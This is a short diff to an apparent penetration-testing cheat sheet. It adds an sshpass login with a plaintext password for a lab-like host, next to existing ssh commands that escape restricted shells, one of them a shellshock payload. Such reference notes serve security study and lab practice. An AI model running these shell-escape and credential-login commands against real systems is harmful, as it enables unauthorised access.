@@ -103,6 +103,8 @@ ssh test@victim -t "/bin/sh"
 ssh test@victim -t "bash --noprofile"
 # try shellshock
 ssh test@victim -t "() { :; }; /bin/bash"
+# try with sshpass
+sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash
 ```
 
 ### Scripting Languages
